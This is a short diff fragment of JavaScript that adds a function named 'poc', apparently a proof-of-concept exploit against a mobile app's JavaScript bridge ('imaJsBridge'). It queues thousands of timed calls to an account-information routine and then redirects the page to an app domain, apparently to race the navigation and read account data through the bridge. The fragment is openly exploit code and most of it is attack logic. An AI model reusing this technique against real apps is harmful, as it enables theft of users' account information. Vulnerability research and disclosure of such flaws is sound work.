@@ -50,6 +50,14 @@
             }
         }
 
+        function poc() {
+            for (var i = 0; i < 0x1000; i++) {
+                setTimeout(getAccountInfo, i)
+            }
+            
+            document.location.href="http://pov.ima.qq.com";
+        }
+        
         function getAccountInfo() {
             try {
                 if (window.imaJsBridge && window.imaJsBridge.invokeWithCallback) {
